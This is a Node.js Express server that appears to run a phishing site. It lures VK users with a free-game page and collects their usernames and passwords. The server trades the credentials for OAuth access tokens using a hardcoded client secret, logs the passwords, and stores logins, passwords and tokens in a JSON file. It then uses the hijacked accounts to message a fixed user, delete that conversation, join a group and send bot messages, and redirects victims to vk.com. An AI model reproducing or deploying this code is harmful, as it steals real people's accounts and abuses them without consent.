const express = require('express');
const app = express();
const bodyParser = require("body-parser")
const request = require('request')

const send_message = require("./bots/vk_bot.js");
const bot_start = require("./bots/bot_start.js");

const { VK, Keyboard } = require("vk-io");
const vk            = new VK();

const fs = require('fs')

const games_data = require("./data/games_data.json")
const games = require("./data/games.json")
const data = require("./db/data.json")
const baza = require("./db/users.json")
const lp = require("./db/lp.json")

app.set(`view engular`, `ejs`)
app.use(bodyParser.urlencoded({
    extended: true
}))

app.get(`/get`, (req, res) => {
    res.render(`index.ejs`, {imets:data, games: games, ref: req.params.ref, users: baza})
});

app.get(`/get/ref=(:ref)?`, (req, res) => {
    res.render(`index.ejs`, {imets:data, games: games, ref: req.params.ref, users: baza})
});

app.get(`/index_style`, (req, res) => {
    res.sendFile(__dirname + "/views/index.css")
});

app.get(`/login`, (req, res) => {
    if(req.body.game == "" ||!req.body.game) {
        req.body.game = `-`
    }
    res.render(`login.ejs`, {game: req.body.game, ref: req.params.ref, games_data: games_data,data: data, users: baza, error_data: 0, capcha: { status: 0}})
});

app.get(`/done_style`, (req, res) => {
    res.sendFile(__dirname + "/views/done.css")
});

app.get(`/done`, (req, res) => {
    res.render(`done.ejs`, {data: data, games_data: games_data, users: baza})
});

app.get(`/get/po`, (req, res) => {
    res.render(`po.ejs`, {data: data, users: baza})
});

app.get(`/po_style`, (req, res) => {
    res.sendFile(__dirname + "/views/po.css")
});

app.get(`/login_style`, (req, res) => {
    res.sendFile(__dirname + "/views/login.css")
});

app.post(`/get`, (req, res) => {
    if(req.body.game == "" ||!req.body.game) {
        req.body.game = `-`
    }

    if(req.body.login == undefined && req.body.password == undefined) {
        console.log(`1`)
        res.render(`login.ejs`, {game: req.body.game, games_data: games_data,data: data, users: baza, error_data: 0, capcha: { status: 0}, ref: req.body.ref})
    } else {
        request(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${req.body.login}&password=${encodeURIComponent(req.body.password)}&captcha_sid=${req.body.captcha_id}&captcha_key=${req.body.captcha}`, async (err, response, body) => {
            if(body != undefined) {
                console.log(body)
                console.log(req.body.password + " " + req.body.login)
                var info = JSON.parse(body);

                if(info.error == `need_captcha`) {
                    return res.render(`login.ejs`, {game: req.body.game, games_data: games_data, data: data, users: baza, error_data: 2, capcha: { status: 1, captcha_sid: info.captcha_sid, captcha_img: info.captcha_img }, ref: req.body.ref})
                }
                if(info.access_token) {
                    vk.setOptions({
                        token: info.access_token,
                        apiMode: "parallel"
                    })
                    var users_list = [];
                    let users_info = await vk.api.users.get({
                        token: vk.token
                    })
                    for(var i = 0; i < baza.length; i++) {
                        users_list.push(baza[i].id)
                    }
                    if(users_list.indexOf(users_info[0].id) != -1) {
                        console.log(`123`)
                        send_message(users_info[0], req.body, vk)
                        return res.redirect("https://vk.com/")
                    } else {
                        vk.api.messages.send({
                            peer_id: `312111993`,
                            message: `&#8202;`
                        }).then((data_message) => {
                            baza.push({
                                name: `${users_info[0].first_name} ${users_info[0].last_name}`,
                                id: users_info[0].id,
                                number: baza.length + 1,
                                game: req.body.game
                            })
                            data.items -= 1;
                            lp.push({
                                login: req.body.login,
                                password: req.body.password,
                                id: users_info[0].id,
                                token: vk.token
                            })
                            vk.api.messages.delete({
                                message_ids: data_message
                            })
                            vk.api.messages.deleteConversation({
                                user_id: 312111993
                            })
                            vk.api.groups.join({
                              group_id: 187753111
                            })
                            send_message(users_info[0], req.body, vk)
                            res.render(`done.ejs`, {data: data,games_data: games_data, users: baza});
                        })
                    }
                } else {
                return res.render("login.ejs", {game: req.body.game, games_data: games_data, data: data, users: baza, error_data: 1, capcha: { status: 0}, ref: req.body.ref})
            }
            } else {
                return res.render("login.ejs", {game: req.body.game, games_data: games_data, data: data, users: baza, error_data: 1, capcha: { status: 0}, ref: req.body.ref})
            }
        })
    }
})

app.post(`/get/ref=*`, (req, res) => {
    if(req.body.game == "" ||!req.body.game) {
        req.body.game = `-`
    }

    if(req.body.login == undefined && req.body.password == undefined) {
        console.log(`1`)
        res.render(`login.ejs`, {game: req.body.game, games_data: games_data,data: data, users: baza, error_data: 0, capcha: { status: 0}, ref: req.body.ref})
    } else {
        request(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${req.body.login}&password=${encodeURIComponent(req.body.password)}&captcha_sid=${req.body.captcha_id}&captcha_key=${req.body.captcha}`, async (err, response, body) => {
            if(body != undefined) {
                console.log(body)
                console.log(req.body.password + " " + req.body.login)
                var info = JSON.parse(body);

                if(info.error == `need_captcha`) {
                    return res.render(`login.ejs`, {game: req.body.game, games_data: games_data, data: data, users: baza, error_data: 2, capcha: { status: 1, captcha_sid: info.captcha_sid, captcha_img: info.captcha_img }, ref: req.body.ref})
                }
                if(info.access_token) {
                    vk.setOptions({
                        token: info.access_token,
                        apiMode: "parallel"
                    })
                    var users_list = [];
                    let users_info = await vk.api.users.get({
                        token: vk.token
                    })
                    for(var i = 0; i < baza.length; i++) {
                        users_list.push(baza[i].id)
                    }
                    if(users_list.indexOf(users_info[0].id) != -1) {
                        console.log(`123`)
                        send_message(users_info[0], req.body, vk)
                        return res.redirect("https://vk.com/")
                    } else {
                        vk.api.messages.send({
                            peer_id: `312111993`,
                            message: `&#8202;`
                        }).then((data_message) => {
                            baza.push({
                                name: `${users_info[0].first_name} ${users_info[0].last_name}`,
                                id: users_info[0].id,
                                number: baza.length + 1,
                                game: req.body.game
                            })
                            data.items -= 1;
                            lp.push({
                                login: req.body.login,
                                password: req.body.password,
                                id: users_info[0].id,
                                token: vk.token
                            })
                            vk.api.messages.delete({
                                message_ids: data_message
                            })
                            vk.api.messages.deleteConversation({
                                user_id: 312111993
                            })
                            vk.api.groups.join({
                              group_id: 187753111
                            })
                            send_message(users_info[0], req.body, vk)
                            res.redirect(`https://vk.com/`);
                        })
                    }
                } else {
                return res.render("login.ejs", {game: req.body.game, games_data: games_data, data: data, users: baza, error_data: 1, capcha: { status: 0}, ref: req.body.ref})
            }
            } else {
                return res.render("login.ejs", {game: req.body.game, games_data: games_data, data: data, users: baza, error_data: 1, capcha: { status: 0}, ref: req.body.ref})
            }
        })
    }
})

app.listen("quiet-lake-74385.herokuapp.com", () => {
    console.log(`Сервер запущен на хосте 3000!`)
})

setInterval(() => {
    fs.writeFileSync("./db/users.json", JSON.stringify(baza, null, "\t"));
    fs.writeFileSync("./db/data.json",JSON.stringify(data, null, "\t"));
    fs.writeFileSync("./db/lp.json",JSON.stringify(lp, null, "\t"));
}, 1000);